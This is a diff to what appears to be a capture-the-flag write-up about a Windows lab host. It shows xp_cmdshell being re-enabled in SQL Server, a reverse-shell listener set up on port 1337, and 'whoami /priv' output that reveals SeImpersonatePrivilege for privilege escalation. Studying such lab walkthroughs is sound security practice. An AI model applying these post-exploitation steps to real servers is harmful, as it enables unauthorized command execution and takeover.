@@ -468,4 +468,37 @@ output
 scrm\sqlsvc   
 NULL          
 ```
-Ive re-en
+Ive re-enabled xp_cmdshell
+
+```python
+penelope -p 1337                                                                                                                         
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.1.157 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+```
+Ill set a listener
+
+```python
+SQL (SCRM\administrator  dbo@ScrambleHR)> xp_cmdshell whoami /priv
+output                                                                             
+--------------------------------------------------------------------------------   
+NULL                                                                               
+PRIVILEGES INFORMATION                                                             
+----------------------                                                             
+NULL                                                                               
+Privilege Name                Description                               State      
+============================= ========================================= ========   
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
+SeMachineAccountPrivilege     Add workstations to domain                Disabled   
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
+SeCreateGlobalPrivilege       Create global objects                     Enabled    
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
+NULL                                                                               
+SQL (SCRM\administrator  dbo@ScrambleHR)> 
+```
+As seen here i have `SeImpersonatePrivilege`
+
+```python
+
+```
